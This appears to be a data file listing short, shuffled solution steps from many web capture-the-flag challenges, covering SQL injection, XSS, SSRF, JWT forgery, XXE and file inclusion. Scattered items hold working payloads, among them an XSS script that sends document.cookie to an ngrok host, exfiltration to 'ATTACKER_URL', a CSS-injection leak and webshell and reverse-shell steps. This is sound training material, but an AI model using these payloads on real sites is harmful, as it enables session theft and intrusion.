    "Stored the '__proto__' key as ['__proto__'].",
    "Observed the comparison between the calculated hash and the 'hash' value",
    "Use the Python subprocess library's getoutput() function.",
    "Open jwt.io website.",
    "Identify two JavaScript files",
    "Determined the user table and the number of columns that need to be unioned.",
    "Execute 'cat index.php' command",
    "Captured the flag with the payload.",
    "Interpreted how 'pkg' and 'pkgPath' can be controlled.",
    "Discover that the 'auth' cookie was previously set in 'gethash.sh'",
    "Overwrite document.domain using Object.defineProperty(document, 'domain', {value: 'yeunote.ctf.yeuchimse.com'});",
    "Start a new process.",
    "Find a HTTP service.",
    "Understand the requirement of achieving XSS within the 'localhost:3000' origin",
    "Performed SSRF to rabbitmq http API",
    "Successfully obtain the flag.",
    "Create a fetch request",
    "Inspect the code of the 'query_kill_time' function.",
    "Discover the config.py file.",
    "Discovered that headless mode of Chrome doesn't perform cache partitioning.",
    "Checked the category and points of the challenge. It was a web category and was worth 1783 points.",
    "Observe the sending of an SMS",
    "Applied the payload to the live environment",
    "Chose to craft a spaceless command injection payload.",
    "Check the source code of the website.",
    "Encoded the contents of the retrieved file in base64 format for smooth transfer without encoding issues",
    "Found that there were no escaping countermeasures for the ':' character.",
    "Ran the 'bzr revert' command to restore the 'index.php' file.",
    "Suggested that the 'shell_exec' function is running.",
    "Create a script to generate the JWT payload.",
    "Downloaded website source code",
    "Study the registration and login process.",
    "Test CSS injection",
    "Determined that the payload was executed before serialization",
    "Navigated to 'branch' folder within '.bzr' directory.",
    "Set up a simple Node.js server backend.",
    "The payload measures the time taken to fetch 'y.png'.",
    "Execute 'cat cmd.php' command.",
    "Retrieve user information",
    "Confirm that the request to the '/auth' endpoint is made locally by the admin bot.",
    "Polluted 'exports' in '__proto__.path' to load the JavaScript file.",
    "Make a GET request to the /api/admin endpoint with the new JWT.",
    "Identified 'ctx.state.user' as the target of the settings",
    "Accessed the Favicon of the webpage",
    "Find a reference to authentication.php in the index.php code",
    "Explored the Firestore environment and found a canvas for users.",
    "Work on bypassing '{{' by using an if-else statement.",
    "Decompile binary.",
    "Read the flag",
    "The 'access_log' class has a '__toString()' function",
    "Ensure the chosen parameter is non-alphanumeric.",
    "Collected from the error message.",
    "Pollute '__proto__' attribute with a command injection payload in the 'data'.",
    "Noted that each character of the flag has a background URL corresponding to it.",
    "Modified the payload script.",
    "Change the cookie values: userID to 768 and username to 'admin'.",
    "Find 'update-dist-tags.js' script.",
    "Uploaded a file to the FTP server",
    "Utilize the aforementioned method for money generation",
    "Perform a login using the web application",
    "Noticed a note that stated 'under protection', indicating the presence of security measures on the platform.",
    "Realize that the 'magic code' needed to login won't be received via email",
    "Successfully extract the flag: OOO{0ld@dm1nbr0wser1sth30nlyw@y}.",
    "Recognize that the 'valid_ip' function restricts usage of certain IP addresses.",
    "Discover a template injection vulnerability.",
    "Website evaluates the 'xxe' entity",
    "Manipulate the fact that WebSocket connection validation does not guarantee that the page is hosted on localhost.",
    "Identify that the structure of the script can be seen as something like '(x, y)()'.",
    "Send image data externally using the 'src' attribute of the generated script tag.",
    "Take note of the embedded iframe",
    "Craft a payload to return the content of /flag/flag.txt.",
    "Observe the code fetching the flag based on the pin value.",
    "Intercept data between the server and the client.",
    "Observed the application displaying contents of '/api/answer'.",
    "Analyze the response headers.",
    "Checked and confirmed both strings had the same md5 hash.",
    "Use HTTP request smuggling techniques",
    "Apply the determined attack vector to exploit the system.",
    "Direct access to the flag was not successful.",
    "Noted that queries to this column return blank results.",
    "Read the 'pdf1.bin' file.",
    "Brute-forced the OTP character by character.",
    "Access the provided URL",
    "Use the original token-generating IP address",
    "Checked the login page source code.",
    "Test classic SQL Injection payloads.",
    "Create a payload using functions that, when run, return 1337",
    "Use RegEx payload.",
    "Logged in.",
    "Inspect 'challenge/routes/index.js' file for SSTI vulnerability.",
    "Search for `flag.txt` in the root directory.",
    "Visited '/?file=checkpass.php'.",
    "Identify the ASCII representation within the encoded string",
    "Validate the files with SHA256 sums",
    "Find the endpoint '/dogooo/user/create' for creating new users.",
    "Observed that Nginx sees the 'Transfer-Encoding' header.",
    "Used previous step's vulnerability to upload.",
    "Create a payload without dots or double slashes.",
    "Analyzed the challenge website where notes could be created and searched.",
    "Analyze the provided PCAP file.",
    "Search for comments within the HTML source code",
    "Enter the correct pin.",
    "Triggered the `api_post` event.",
    "Combine all three parts of the flag together",
    "The payload utilized was designed to fetch cookies.",
    "Found the `clipboard_getData` function in `main.dart.js`.",
    "TranslateBBCode routine is in bbcode.asm file part of FreshLib",
    "Visit the URL: https://redpwn.net/",
    "Realize that by adding X-Forwarded-For: 127.0.0.1, an SSRF is possible to the /sakura endpoint.",
    "Created `/cookie/` endpoint for receiving exploited cookies",
    "Using the constructed base, tried to enumerate DB tables.",
    "Utilized path traversal to access /etc/passwd file.",
    "The if statement evaluates to true.",
    "Use PHP system() function",
    "Implied a possibility of Cross-site Scripting (XSS)",
    "Reset the session",
    "Send an HTTP POST request via the /cow_designer page.",
    "Cookies are sent by the executed payload to the netcat listener.",
    "Decode `aW1nMS5qcGc=` to identify it as `img1.jpg`.",
    "Attempt to refactor the code.",
    "Observe the flag after refreshing the page",
    "Link the potential exploits to the presence of prototype injection vulnerability in the server-side code.",
    "Noticed that the proxy server makes a request to the backend server.",
    "Messages were signed using ED25519.",
    "Observed that the 'basename()' function ignores invalid characters",
    "Connect to the URL http://jh2i.com:50000",
    "Observe from user session that the identifier is stored",
    "Identify the source code of the application.",
    "Receive the flag on the attacker server.",
    "Receive the flag from the listening host",
    "To find the flag",
    "If the URL loads, log that the port is open.",
    "Submit the script in the URL",
    "Assume a Local File Inclusion (LFI) exploitation is required",
    "Discover the usage of `node-serialize` in User.js",
    "Examine the page's source code.",
    "Assign specific values to variables if challenge is 'Gate keeper'",
    "Discover the SQL Injection payload from the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,username,null,null,null,null/**/from/**/users'",
    "Identify the bug in the API.",
    "Launch BurpSuite.",
    "Noted that the `ApiMapper` makes a GET request.",
    "Reveal the flag by accessing the path.",
    "Use character substitution '$()'.",
    "Visit the website.",
    "Perform image file upload",
    "Iframe posts the response from the /api/filter endpoint to window.parent",
    "Select two strings from the 'magic hash' list that have a length of 15 or more characters",
    "Consider the file indicative of the flag for the challenge.",
    "Used the exploit.",
    "Validate the encoding function by checking if it produces the same encoded message as captured in unmasked WebSocket packets in Wireshark.",
    "Accessed the Startup Company web page.",
    "Checked if the search took more than 50ms.",
    "Test the app.",
    "Identify JavaScript variable storing user details.",
    "Adjust script to identify differences made.",
    "Expect to find the flag before the suspicious commit.",
    "Created a custom 'Login' object.",
    "Noticed that the 'books' table has two columns: 'id' and 'info'.",
    "Exploit LFI vulnerability to execute the PHP command",
    "Decode the base64-encoded string received from the previous step.",
    "Tuned the starting point of the redirection",
    "Create a code snippet: `EOCA$eyes=`ls`;print '$eyes';`.",
    "Understand the purpose of 'notes.count'.",
    "Identify that the flag was formed by computing the MD5 hash of the username, password and a salt",
    "Assign the value 'true' to the cookie.",
    "Diverge the template at a certain point to create two different PDFs.",
    "Discovered a script on the `index.php` page",
    "Execute the JS script silently when admin opens the page.",
    "Found that http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/data.php lists all HTML files",
    "Observe the contents of the first page",
    "Assign user value as 'admin'.",
    "Checked that balance never went below 0.",
    "Observe different messages based on query results",
    "Hypothesized that the login page might be filtering requests by the user's IP address.",
    "Verify that .phtml extension executes PHP code.",
    "Our malicious script grabs the current cookies and redirects to our webpage with these cookies as parameters in the request.",
    "Had to devise a new strategy as this query was of type 'INSERT'.",
    "Use the octal notation of 127.0.0.1 IP address.",
    "Try SQL Injection on the data passed using fragment values",
    "Note that only js, ts, cpp, c files are allowed",
    "Used X-Forwarded-For header",
    "Note the presence of 'username', 'cnonce', and 'hash' parameters.",
    "Name the cookie 'username'.",
    "Understood that to trigger curl execution, 'doit' method must be invoked.",
    "Understand its format.",
    "Enter an apostrophe in the username field.",
    "Performed the action of accessing challenges.",
    "Executed the timing attack.",
    "Understood that a string needs to be found to match the MD5 hash of the challenge.",
    "Notice that the login occurs only if the user's IP address is one of the whitelisted IP addresses or when the debug mode is enabled.",
    "Note that the PHP shell can be executed by visiting the uploaded file",
    "Identify the condition for invoking the 'send_sms' function",
    "Added the CSS and generated CSS to a GitHub repository.",
    "Observed server side validation for valid user during file retrieval at `/users/<username>/files/<filename>`.",
    "Exploit PHP's type conversion",
    "Construct the request for the flag",
    "Identify off-by-one error in `background.js` font validation",
    "Craft a value for the cookie",
    "Implement bitwise XOR operation in PHP to bypass checks.",
    "The attack starts with executing an XSS to grant admin privileged access",
    "Receive the Base64 encoded png file on the local machine.",
    "Attempt to open a bind shell on port 4444.",
    "Identify the second part of the flag within a comment",
    "Connected to the provided web site.",
    "Connect to source code link",
    "Use an editor",
    "Retrieve content of index.php file",
    "Validate that only one result is returned.",
    "Identify a key called 'likeCookie' with a value of false.",
    "Realize that the JS file compares the calculated hash with the original hash.",
    "Crafted a malicious payload.",
    "Search for a way to embed an image into a mermaid flowchart",
    "Realize that the encryption key can be reverse-engineered",
    "Found '/opt/yarn-v1.22.19/preinstall.js' in the container.",
    "Perform XOR operation between the uploaded file and `cipher + 0xd34db33f`.",
    "Used the value ':wq' for the 'exit' parameter.",
    "The message hinted that the flag was already visible.",
    "Determine that the webpage is created by executing an eval from a payload query parameter or calling the directory() function.",
    "Understood how python pickles can be used for Remote Code Execution",
    "Create a new user.",
    "Use Wireshark to read the packet capture file.",
    "Identify 'login.php' and 'login.php.bak' files",
    "Deduced that the suffix of 'c1' and 'cp1' are the same.",
    "Identify incoming cookies from the victim's browser.",
    "The exploitative script is run in the background.",
    "Perform URL enumeration",
    "Access the flag.",
    "Insert 'blue}; input[type=\"password\"][value^=\"c\"] {background-image: url('https://example.com?c');' into the color input field",
    "Extract the final flag.",
    "Observe the result",
    "Observe the presence of a WAF named 'Skynet' that filters requests.",
    "Created a Python script that opens a reverse shell",
    "Identify a packet (#6) in the PCAP file",
    "Extract the flag from the server response.",
    "Observed that the web application uses PhantomJS/2.1.1",
    "Identify the third part of the flag within the file contents",
    "Understood the structure of the 'Login' object.",
    "Target the URL file:///tmp/flag.txt.",
    "Confirmed a Bazaar repository's existence.",
    "Determined that the result of the SQL query was used to populate the PHPSESSID cookie by analyzing the HTTP responses.",
    "Suspect possible SQL Injection.",
    "Enter an apostrophe in both the username and password fields.",
    "Payload loads /demo in an iframe",
    "Implemented the attack using 'Lazy-loading' property.",
    "Followed directory path indicated in the scan result.",
    "Sent a GET request to the provided URL: http://35.222.174.178/maria/.",
    "Use the PHP /// uri.",
    "Type the hidden sheet's name",
    "Obtained the first flag.",
    "Perform a test with an invalid productId value",
    "Access the website's file upload functionality.",
    "Created a custom SQLMap tamper script.",
    "Used a malicious cookie value for exploitation.",
    "Bypass the bracket-based sanitization by adding an extra '>' in the start.",
    "Automate the full exploit chain in solve.py.",
    "Identify that the <script>alert('pwned')</script> won't be executed.",
    "Used the created admin account to register with the username 'm3ssap0' and password 'pwnd:true'.",
    "Accessed 'http://challenges.auctf.com:30020/robots.txt' on the browser",
    "Identify the vulnerability (CVE-2022-26377).",
    "Considered the XML-related error spawned previously.",
    "Decode the copied JWT token using a website like jwt.io.",
    "Used the AWS credentials found in the 'config' schema.",
    "Think of exploiting this opportunity.",
    "Attempt using various SQL injection payloads on the login page.",
    "Find the feedback form on the website.",
    "Receive cookie as a result of successful login.",
    "Download the source code.",
    "Register a user",
    "Identified parameters in the WebSocket message.",
    "Analyze the PHP code for potential vulnerabilities",
    "Access the book in which the flag is contained.",
    "Recognized that the condition for this to occur was the function not being called.",
    "Examine the Content-Security-Policy of the target website.",
    "Specify the 'RS256' algorithm for signing",
    "Point 'xxe' to the required file 'file:///flag.txt'",
    "Exit the script.",
    "Visit the login page.",
    "Understand the control of the resulting template",
    "Ran 'bzr check' command in the command line.",
    "Identify the database containing 'md5' hashes.",
    "Expect that one of the nonces will work",
    "Request http://104.197.168.32:17012/bashferno.cgi.",
    "Identified the potential for a JWT key confusion attack.",
    "Access unauthorized data or perform unauthorized actions.",
    "Continue running the script until the flag (password) is fully discovered.",
    "Extract the source code from /src.tgz.",
    "Craft the parameter as '5779715767432985082/../../admin'.",
    "Received the response from the web page.",
    "Open source code of the webpage",
    "Identify the suspicious logic of the JavaScript.",
    "Reveal that session data is stored as a serialized pickle python object.",
    "Write an SQLMap tamper script.",
    "Tried passing custom callback parameter to `api.php` endpoint",
    "Exfiltrate the data to 'http://ATTACKER_URL'.",
    "Review the robots.txt file",
    "Find a lot of printed information",
    "Discover list of created books hosted on the server.",
    "Observe the presence of a 'nonce' in the Content-Security-Policy that allows a script with src='assets/js/bootstrap.js'.",
    "Recognized the 10% chance of success.",
    "Notice that the user's sessionID is used in a redis eval() call with a lua script.",
    "Observe possibility of XSS attack from bot's lens.",
    "Restarted the container.",
    "Observe the vulnerability in the incoming responses at the '/checkbalance' endpoint.",
    "Use a Python script to find `<class 'subprocess.Popen'>` in the subclasses",
    "Identified the additional table holding the flag.",
    "Retrieve the flag from the file \"flag.txt\".",
    "Scan the 10.0.42.0/24 network.",
    "Caused an SQL error.",
    "Identify another part of the Nginx configuration that preserves request headers when requests are forwarded to Gunicorn",
    "Identify the 'secret_key' column within the database.",
    "Discovered a folder '/ctf'.",
    "Opened 'last-revision', revealing the last update to the directory.",
    "Sent another curl request",
    "Used the 'flag' value on '/com/seaerch/' endpoint.",
    "Decode the base64 response",
    "Observe the vulnerability's location after the ORDER BY clause",
    "Implemented a trick to bypass `innerText` resetting the prepared CONFIG clobbering in the payload.",
    "Run the script.",
    "Successfully logged in as admin.",
    "Inject CSS through the input box",
    "Guess combinations of characters",
    "Identified the wildcard DNS configuration responsible for the pointing.",
    "Decided to use the `jsonp` method",
    "Identify that a cookie is set after login",
    "Open the cURL tool",
    "Use the new session cookie to log into the site.",
    "Take note of the returned JavaScript code",
    "Script was launched causing the browser to start the voting process.",
    "Found a flag in the 'users' schema.",
    "Identify JWT 'identity' cookie as '31337'",
    "Reveal the '/admin' directory's contents.",
    "List the directory.",
    "The absence of 'nc' and any exfiltration method restricts the options",
    "Received SQL query result and examined the output.",
    "Craft the AJP request to leak the source code of index.jsp.",
    "Obtain a new session cookie as output.",
    "Adjusted payload produced from serialization operation.",
    "Understand the possibility of retrieving the flag by crafting and serializing a custom 'access_log' object",
    "Discovered interesting information in the 'iam list-roles' response",
    "Created new user with username 'FRONTEND_USERNAMEamount1337' to manipulate the message format.",
    "If it does, append guessed character to 'flag' and continue process",
    "Noticed an excerpt button on the webpage.",
    "Open the file using an appropriate application or viewer.",
    "Discover clickable links that reveal 2 blog posts.",
    "Developed a payload to read the flag file",
    "Analyzed the client source code.",
    "Realize that the secret key needs to be cracked.",
    "Recognize the challenge requires locating a flag in /var/www/html/flag.php on a web server",
    "Identify 'b' as the character that successfully returns the flag",
    "Identify the challenge as a beginner SQL Injection challenge.",
    "Notice the website allows HTML input.",
    "Identify a hint in the website.",
    "Create another Perl code snippet.",
    "Access the website.",
    "Engaged with different features of the meme generator.",
    "Submit the authorization request",
    "Perform the action of uploading the gif.",
    "This function adds our user provided query to the database and then calls 'bot.readQueries(db)'.",
    "Identify that the WASM module uses the 'str.length' to validate the buffer.",
    "Exfiltrate all password characters via blind SQL injection",
    "Identify the presence of a potential password.",
    "Note the showcasing of uploaded photos.",
    "Add the header X-Forwarded-For to the request.",
    "Connect to the website 'https://web5.ctfsecurinets.com/flags.php'",
    "Use JavaScript code using `document.cookie` to control variables in the payload.",
    "Identify that if the request token is wrong, then the 'request.accessGranted' attribute would not be set.",
    "Noticed that the SHA256 hash is calculated using the concatenation of 'password' and 'salt'",
    "Obtain the email of the target: alexo@uupeye.edu",
    "Identify the algorithm mentioned in the cookie value.",
    "CSRF payload is created",
    "Accessed URL http://138.68.228.12/?is_debug=1.",
    "Found a passcode in the downloaded files",
    "Host a file at `/static/page.js` on the attacker server.",
    "Contained the database name.",
    "Include a script to alert the document's cookies in the uploaded LaTeX document",
    "Weak point: negative flag price not validated in 'sellFlag' function",
    "Recognize the potential JWT exploit (CVE-2016-5431/CVE-2016-10555).",
    "Extract the count of PDF pages from the initial PDF files.",
    "Identify the exposed methods as 'notes.count', 'notes.add', and 'notes.remove'.",
    "Performed a GET request on the chosen URL.",
    "Check if any of the tested characters bypass the template engine",
    "Used AWS CLI to access the 'palindromecloudynekos' S3 bucket",
    "Observe the existence of a blacklist filter.",
    "Note that '.' and 'js' need to be the last two elements of the array",
    "Focus on the command line subprocess interaction.",
    "Introduced three separate payloads in the HTML.",
    "Discovered that it allows for a domain-literal format, which permits just about any printable ASCII character.",
    "Iteratively added a character to the flag.",
    "Found new endpoint for POST requests",
    "Identified application logic.",
    "Identify potential vulnerabilities and points of entry in the website.",
    "Queried the 'nxf8_sessions' table for session IDs where 'user_id' is 5.",
    "Analyze the downloaded source code",
    "Led to the Flask.app object",
    "Keep reading until reaching the line at the bottom.",
    "Attempt to send 'POST' data to 'profile.php' with a different 'Referrer'",
    "Identify a potential vulnerability to SQL injection.",
    "Display the iframe in the screenshotting service.",
    "Access the URL `https://xmas.2020.chall.actf.co/admin`",
    "Found that 'POST' and 'PUT' returned a different result.",
    "Identify that the challenge consists of 3 services - a Python microservice",
    "Add the attacker's email to the admin's shared list.",
    "Recognize that this is usually not possible due to the CSP.",
    "Understand that the history length can be used to approximate the user's balance.",
    "Recognized that the admin's request is appended to the incomplete second request.",
    "Make a decision to achieve remote code execution.",
    "Receive a response from the server.",
    "Noted that the 'shell_exec' function may be unsanitized.",
    "Exploit Shellshock vulnerability",
    "Use LFI to access the code of the 'delete' resource",
    "Access the flag.txt file.",
    "Examine the login screen.",
    "Explore other files in the repo",
    "Understand that our payload is converted to uppercase before being written to the innerHTML.",
    "Insert the payload which is a URL that generates a password change request for the admin account when clicked.",
    "Have the intention to alter the JWT 'username'.",
    "Attempt to send 'POST' data to 'manage.php' with a different 'Referrer'",
    "Create a file of 1024 bytes with a random name ending in '.txt'.",
    "Aligned the chain with the identified vulnerability.",
    "Specify the previous commit that contained the flag ('flag.jpg').",
    "Identified an admin bot script provided by the challenge.",
    "Authenticated using the password 'csictf'.",
    "Read the response from FD 4.",
    "Message is only sent to the intended receiver",
    "Access the flag purchase system",
    "Identified the message event handler added to the window.",
    "Add the first A record to the DNS entry to resolve to 127.0.0.1.",
    "Receive the flag.",
    "Found out it is an online calculator.",
    "Trigger the 'add_money_to_login' function through the 'render_template_string' function",
    "Go through the provided source code.",
    "Create an infinite loop.",
    "Capture the Admin Bot's cookies.",
    "Discover flag.txt file in the /home directory",
    "Access the found Laravel panel",
    "Run the command `echo shell_exec(\"../flag\");` on the website.",
    "Receive GET request to /save.php.",
    "Checked the forgot password feature.",
    "Force the debugging private key in the payload.",
    "Locate the loop() function within addCaptcha()",
    "Identified that the website is a GitHub Pages site.",
    "Find that the get_remote_addr() function from the file bookhub/helper.py is used to get the user's IP address.",
    "Confirmed the successful acquisition of the flag",
    "Make the inference that if debugging is enabled, it would likely be on the development server.",
    "Identify XML External Entity (XXE) vulnerability when loading SVG files.",
    "Submit a note.",
    "Understood the website allowed changing the theme via a URL parameter `theme='value'`",
    "Navigate to the network tab.",
    "Observe the cookie 'not_admin' after form submission",
    "Generate customized versions of the `User` and `Login` objects that allow bypassing the MFA token check.",
    "Noted the appending of an entry to a log file.",
    "Triggered the payload through an iframe by entering that into the webpage's input field",
    "Create an iframe within `exploit.html` with the source set to `http://localhost:3000/render?url=http://api:8000/`.",
    "Understand that this value can be fetched from HTTP headers.",
    "Crafted a payload using 'GET / HTTP/1.1'.",
    "Initialize CTF task.",
    "Generate payload for rearranging password.",
    "Configure the personal DNS server to respond with a public IP during the IP check.",
    "Set the header value to the internal IP address observed from gallery.php.",
    "Understand that it is a wrapper function.",
    "Set 'EOF' as the termination condition of the script",
    "Determined the system only responded with the flag if the request came from the loopback network.",
    "Make a GET request to /login/ to trigger the deserialization.",
    "Noticed that Nginx considers the first request ended with the 'Transfer-Encoding' header.",
    "Note that the initial SQL injection tactic yielded access but not the password",
    "Reported the findings on the platform provided for the CTF Challenge.",
    "Complete the login on the website",
    "Identify the SQL Injection vulnerability",
    "Web page performs a password reset function using security questions",
    "Verify if a substring exists in the flag.",
    "Specify the different IP address in the SQL query",
    "Obtain column names from information_schema.columns",
    "Repeat for all potential starting letters",
    "Implement the series of steps",
    "Create account at ngrok, download the application, and login.",
    "Downloaded the code for the app",
    "Understand vulnerability of upload functionality",
    "Send the crafted POST request to the server",
    "Requested the '/FLAG' endpoint.",
    "Examined the 'package.json' file in the site source.",
    "Notice that .html files are rendered inline.",
    "Inject a SQL query into the barcode generation process.",
    "View all previous commits in the repository.",
    "Initialize certain variables with specific values if challenge is 'taxi union'",
    "Observe that the first check points to a GET parameter with underscores.",
    "Directed the admin to '/save.php'.",
    "Search for a way to call a function without parentheses.",
    "Repeat the attempts until the flag is obtained.",
    "Identify the use of phar:// uri.",
    "Finally, input the payload into the frontend for the application.",
    "Start at a login/register page.",
    "Enter the password 'jjLLgTGk3uif2rKBVwqH'",
    "Acquired the file from the provided link",
    "Examine the 'challenge/routes/index.js' file. We find an '/api/submit' endpoint which the frontend sends user data.",
    "Gained shell remote code execution.",
    "Include a PHP command in the 'name' parameter",
    "Combined both parts of the flag to solve the challenge.",
    "Utilized 'x:script' to exploit the vulnerability.",
    "Understood that the variable part contained the previous char of the flag.",
    "Open a web browser.",
    "Build Remote Code Execution (RCE) payload using '().__class__.__subclasses__.__getitem__(x)' method.",
    "Identify that the JWT field 'failed' is set to 'true'.",
    "Found a clue in the same comment to check 'd4rks0c1ety' page for the rest of the flag",
    "Expect the execution to result in a reverse shell.",
    "Obtained AWS credentials from the response",
    "Enter the token into the provided form field",
    "Understand what the code does.",
    "Recognize the calculator app filters out potential XSS attacks",
    "Sent a GET request",
    "Use a python script to send requests.",
    "Exclude the existing private key parameter through '#'.",
    "View the login form",
    "Identify additional pages: upload.php and photos.php",
    "Review the battle endpoint.",
    "Inspect the source code of the webpage",
    "Remove the intermediate 'merged.pdf' file.",
    "Identify the octal notation of 127.0.0.1 IP address is 0177.0.0.1.",
    "Discovered the flag.",
    "Assumed an admin visit to the site.",
    "Create an SQL injection payload.",
    "Reload the server script.",
    "Use the phar:// uri in the XML External Entity vulnerability.",
    "Evaluate sequential requests",
    "Determine that the tripcode is a part of an encrypted string",
    "Note that the server does not have CURL.",
    "Recognize the presence of a Local File Inclusion vulnerability on '/post.php'.",
    "Analyze the window's history length to determine if a redirection has occurred.",
    "Determined that the function `shellme()` is defined in the shared object `shellme.so`.",
    "Exfiltrated the '/readflag' output using the defined payload.",
    "If the history length is not three, the balance is exceeded.",
    "Viewed the admin's cookie and 'X-Access' headers.",
    "Accessed the URL `http://yai.sstf.site/paperdetail.php?idx=32%27%20and%20@published=%27no%27%20or%20%27a%27=%27b` to execute the injection attack.",
    "Retrieved the 'id' of Maria from the user table.",
    "Identify that the web application has registration, login, and readfile functionalities",
    "Guessed the requirement of an 'application/x-www-form-urlencoded' parameter.",
    "The alert in the browser indicates a Cross-Site Scripting (XSS) vulnerability",
    "Read the obtained flag",
    "Test the filter.",
    "Created a script to brute force the OTP by appending '%' to the email and incrementally changing the OTP.",
    "Analyzed the webpage.",
    "Sent the request 'type=/../super_secret_shell.php'.",
    "Examine the /add endpoint.",
    "Enter while loop",
    "Discovered that using 'test' or 1-- - can obtain possible account credentials",
    "Read the presented flag",
    "Received 404 Not Found error upon a failed enumeration.",
    "Identify potential for XSS due to unsanitized input field",
    "Recognize that they are defined before the 'eval()' statement",
    "Understood how MySQL executes query portions inside comments.",
    "Paid particular attention to the HTTP headers: 'Server', 'Via', 'X-Served-By'.",
    "Manipulate the '<base>' tag in the target website to change the base URL to the control of the attacker.",
    "Extract the second flag from the decoded field.",
    "Assign the `login` cookie with the output obtained from the previous step.",
    "Redirected the flag to a file in the invoices directory.",
    "Notice that the PHP configuration has several functions disabled",
    "Research if PHP manipulates input parameters' names.",
    "Use CrackStation to decrypt the hashed passwords.",
    "Exploit LFI vulnerability",
    "Utilize SSRF exploit to write to the created symlink",
    "Examine the request route for '/adminNames'.",
    "Noted the creation of a 'storage.db' file",
    "Open a window.",
    "The content in MiniMag and BBCode format is accepted as 'format' in the post submission request data",
    "Ensure the user's name and password are equal to the secret",
    "Observe that the server script uses a secure cookie for comparison to display a flag value.",
    "Learn about special characters usable in regex from the documentation.",
    "Take the screenshot of the flag.",
    "Downloaded the 'last-revision' file from the target server.",
    "The response corresponded to '/flag' instead of '/'.",
    "A valid login has been achieved.",
    "Set the Path of the custom cookie to /get.",
    "Created a Python script for a brute-force attack on the prefix.",
    "Identify FILENAME.",
    "Locate the login function in the web application.",
    "Verify that the WebSocket client's origin starts with 'http://localhost'.",
    "Identifying that process.env.FLAG in db.createNote({ data: process.env.FLAG }) is storing the flag.",
    "Tested rendering of the reflected input in the browser.",
    "Use the 'tryNumber' function.",
    "Attempt to break out using '?cat=news\\\\''.",
    "Realize that the password is the flag.",
    "Further inspect the contents of 'functions.php' file.",
    "Upload a PHP webshell.",
    "Discovered the API endpoint /api/users/update.",
    "Enter 'Marathon' for Favorite Olympic Event",
    "Configured the attacker server to make 19 redirects.",
    "Executed the modified command and obtained the flag output from the server.",
    "Write a payload using the Template Literal method.",
    "Visit the GitHub URL.",
    "Use the lazy-loaded image.",
    "Revealed the 'username', 'uid', and 'iat' from the decoded JWT token.",
    "Found the last piece of the flag: 1nsp3ction_",
    "Injected a UNION query.",
    "Analyze the URL 'http://35.207.189.79/pyserver/server.py'.",
    "Identified that the binary calls the 'id' command three times, without privileges",
    "Observe that the violation can be detected through a 'securitypolicyviolation' event listener",
    "Noted potential XXE vulnerability because of 'LIBXML_NOENT' flag in 'loadXML()' function.",
    "Attempted to escalate privileges by changing the 'uid' from 100 to 1 using the previous payload.",
    "Return the content of 'satellite.txt'.",
    "Receive partial flag",
    "Use the LaTeX function \\StrMid to isolate the '/' symbol.",
    "Registered a new account.",
    "Explore the non-admin path, /sakura.",
    "Recognize that the sha512.js script will be filtered as a result of appending the parameter.",
    "Observed POST request capability.",
    "Enclose 'ls' command in backticks.",
    "Untick the box to make the private gallery public.",
    "Encountered an error due to permissions",
    "Given login credentials for an online portal with MFA and Captcha code protection.",
    "Identified that the page at port 8080 is the same as the public challenge site.",
    "Examined source code of 'santa_mon.sh' program.",
    "Infer that the IP address has prefix 219",
    "Generate random content for the file.",
    "Successfully log into the admin panel.",
    "Locate a line of PHP code within error logs.",
    "Notice an undeleted Tweet.",
    "The flag was 'RS{4!way5_Ke3p-m0v1ng}'",
    "Read the just created payload",
    "Open the XML file",
    "Open the final.txt file in the path",
    "Realize that the buffer length can be less than the number of characters written into it.",
    "Site has a login screen.",
    "Construct a Python script.",
    "Determine it is a hexadecimal representation",
    "Identify the page as having an Apache2 default index.",
    "Observe login page with no additional information.",
    "Checked the filter page again to see any changes",
    "Discovered `<` and `>` characters were protected using a `replaceAll` function.",
    "Understand the submitted data during registration",
    "Send a post request with the payload for every possible character in the flag.",
    "Enumerate the folder content.",
    "Used 'Updatexml()' in the SQL payload.",
    "Set the username as '{open('/flag').read()}' to trigger a Remote Code Execution during authentication.",
    "Connect to the website",
    "Identify server directories",
    "Exfiltrate data.",
    "Understand that 'window.name' can be controlled when a new window is opened.",
    "If 'True' is present, append the flag string character to the flag.",
    "Familiarize with TranslateBBCode routine",
    "Use hashlib, URLSafeTimedSerializer and TimestampSigner in Python.",
    "Identified that an error was thrown during rendering.",
    "Set the settings",
    "Observe a disallowed directory: /backup/.DS_Store.",
    "'smtp_exec' variable is used in sending activation emails",
    "Locate the file named '(wtf.mp4)'.",
    "Choose the '-vf drawtext=...' option within the 'ffmpeg' command as the method of exploitation.",
    "Create a token with the overridden '[object Object]' as the secret key.",
    "Receive a link to the note.",
    "Analyze the HTML of the page.",
    "Use version 43.0 for the user-agent string.",
    "Observed internal subnet addresses on the devices.",
    "Realize that the input 'language' in the JWT token is used for reading the arbitrary files.",
    "Identify SQL injection is possible.",
    "Recognize that the function for generating a token is using string interpolation to inject variables directly into the token string.",
    "Contemplated on triggering a custom Cloudflare error.",
    "Navigate to the S3Scanner directory",
    "Found a potential hint: c4n_r3ve4l_",
    "Receive the flag.",
    "Retrieve the flag.",
    "Conduct communication with the server.",
    "Analyse the given hyperlinks.",
    "Find the public key in '/signature/key.pub' as indicated in the hint.",
    "View PHP source code",
    "Inspect how the website stores the 'name' parameter",
    "Hypothesize that the web app could be stored in the same directory.",
    "Observe the 'get_user_info' method during authentication in the User class.",
    "Send the crafted request to confirm the vulnerability and the input reflection.",
    "Started the app with 'PORT=8080 npm run start'",
    "Accumulate a significant amount of money",
    "Set the <userID>_isAdmin value to 'yes'.",
    "Input your ngrok URL into the malicious payload. For example, if ngrok URL is 'http://92832de0.ngrok.io', then the payload should be '<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>'",
    "Realized JSON payload cannot have spaces due to regex match.",
    "Used a 'UNION' operation for the SQL injection.",
    "+= performs the operation in place when possible.",
    "Used the following json to upload the updated grades",
    "Configured the server to give two different responses.",
    "Take notice of the 'validateUrls' mechanism",
    "Identify a 'genflag' server.",
    "Passed the payload via the SQL injection vulnerability.",
    "Noted that the SQL query was sent to FD 4.",
    "Discover website hosting on Nginx server 1.15.5.",
    "Discovered 'Report Vulnerability' message",
    "Create a Python script.",
    "Recreate GZip archive",
    "Visit the private section of the website",
    "Intended to display the flag on the welcome page",
    "Locate the 'name' parameter in the '/proc/self/fd/9' file",
    "Pass `['a', 'b', 'c', 'd', '/../flag.txt', '.', 'js']` as an array via the GET parameter",
